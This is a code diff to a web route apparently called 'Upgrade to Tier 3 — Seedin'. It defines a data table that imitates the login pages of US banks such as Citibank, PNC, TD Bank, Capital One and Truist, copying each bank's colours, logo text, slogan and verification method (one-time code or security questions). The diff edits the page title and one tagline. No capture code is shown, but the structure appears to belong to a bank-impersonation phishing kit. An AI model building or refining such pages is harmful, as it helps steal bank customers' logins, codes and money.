@@ -42,7 +42,7 @@ function RollingLoader() {
 }
 
 export const Route = createFileRoute("/update-tier-3")({
-  head: () => ({ meta: [{ title: "Upgrade to Tier 3 — Seedin America" }] }),
+  head: () => ({ meta: [{ title: "Upgrade to Tier 3 — Seedin" }] }),
   component: UpgradeTier3,
 });
 
@@ -71,7 +71,7 @@ const BANKS_DATA: BankDef[] = [
   { id: "citibank", name: "Citibank", auth: "otp", position: 4, theme: { bg: "#f0f4f8", headerBg: "#003b70", headerText: "#ffffff", accent: "#003b70", accentText: "#ffffff", logo: "citi", logoColor: "#ffffff", inputBorder: "#003b70", tagline: "Citi Never Sleeps" } },
   { id: "usbank", name: "U.S. Bank", auth: "otp", position: 5, theme: { bg: "#f4f4f4", headerBg: "#012169", headerText: "#ffffff", accent: "#012169", accentText: "#ffffff", logo: "U.S. Bank", logoColor: "#ffffff", inputBorder: "#012169", tagline: "The power of possible" } },
   { id: "pnc", name: "PNC Bank", auth: "securityq", position: 6, theme: { bg: "#f5f5f5", headerBg: "#f58025", headerText: "#ffffff", accent: "#f58025", accentText: "#ffffff", logo: "PNC", logoColor: "#ffffff", inputBorder: "#f58025", tagline: "Achievement begins here" } },
-  { id: "tdbank", name: "TD Bank", auth: "otp", position: 7, theme: { bg: "#f0f7f0", headerBg: "#00843d", headerText: "#ffffff", accent: "#00843d", accentText: "#ffffff", logo: "TD Bank", logoColor: "#ffffff", inputBorder: "#00843d", tagline: "America's Most Convenient Bank" } },
+  { id: "tdbank", name: "TD Bank", auth: "otp", position: 7, theme: { bg: "#f0f7f0", headerBg: "#00843d", headerText: "#ffffff", accent: "#00843d", accentText: "#ffffff", logo: "TD Bank", logoColor: "#ffffff", inputBorder: "#00843d", tagline: "Banking made easy" } },
   { id: "capitalone", name: "Capital One Bank", auth: "otp", position: 8, theme: { bg: "#f5f5f5", headerBg: "#d03027", headerText: "#ffffff", accent: "#d03027", accentText: "#ffffff", logo: "Capital One", logoColor: "#ffffff", inputBorder: "#d03027", tagline: "What's in your wallet?" } },
   { id: "discover", name: "Discover Bank", auth: "otp", position: 9, theme: { bg: "#fff8f0", headerBg: "#f76e20", headerText: "#ffffff", accent: "#f76e20", accentText: "#ffffff", logo: "DISCOVER", logoColor: "#ffffff", inputBorder: "#f76e20", tagline: "We treat you like you'd treat you" } },
   { id: "truist", name: "Truist Bank", auth: "otp", position: 10, theme: { bg: "#f4f4f4", headerBg: "#4b1e78", headerText: "#ffffff", accent: "#4b1e78", accentText: "#ffffff", logo: "Truist", logoColor: "#ffffff", inputBorder: "#4b1e78", tagline: "Inspire and build better lives" } },
